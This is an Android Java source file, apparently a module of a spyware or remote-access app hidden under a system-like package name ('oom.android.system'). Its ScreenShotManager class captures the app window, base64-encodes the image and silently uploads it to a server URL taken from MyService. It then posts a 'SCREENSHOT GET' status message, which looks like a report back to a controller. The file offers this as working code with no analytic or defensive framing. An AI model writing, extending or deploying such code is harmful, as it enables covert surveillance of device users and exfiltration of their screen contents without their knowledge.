package oom.android.system.Managers;
import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.util.Base64;
import android.util.Log;
import android.view.View;


import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MainActivity;
import oom.android.system.app.MyService;
import oom.android.system.Settings.TypeOpenFile;

public class ScreenShotManager {

    public static Bitmap takeScreenShot() {
        View view = MainActivity.activity.getWindow().getDecorView();
        view.setDrawingCacheEnabled(true);
        view.buildDrawingCache();
        Bitmap b1 = view.getDrawingCache();
        Rect frame = new Rect();
        MainActivity.activity.getWindow().getDecorView().getWindowVisibleDisplayFrame(frame);
        int statusBarHeight = frame.top;


        int width = MainActivity.activity.getWindowManager().getDefaultDisplay().getWidth();
        int height = MainActivity.activity.getWindowManager().getDefaultDisplay().getHeight();


        Bitmap b = Bitmap.createBitmap(b1, 0, statusBarHeight, width, height - statusBarHeight);
        view.destroyDrawingCache();
        return b;
    }

    public static void savePic(boolean Online,Bitmap b) {
        if(!Online){
            FileOutputStream fos;
            try {
                fos = new FileOutputStream(MyService.OpenFile(TypeOpenFile.ScreenShot).getAbsolutePath());
                b.compress(Bitmap.CompressFormat.PNG, 90, fos);
                fos.flush();
                fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }else{
            try {

                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                b.compress(Bitmap.CompressFormat.PNG, 90, bos);

                byte[] byteArr = bos.toByteArray();
                final String encodedImage =  "data:image/png;base64,"+ Base64.encodeToString(byteArr, Base64.DEFAULT);


                post(MyService.output_img,encodedImage);
                post(MyService.post_url,"SCREENSHOT GET");


            } catch (Exception e) {
                Log.e("Error",e.getMessage());
            }
        }
    }


    public static void post(String url, String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }
}
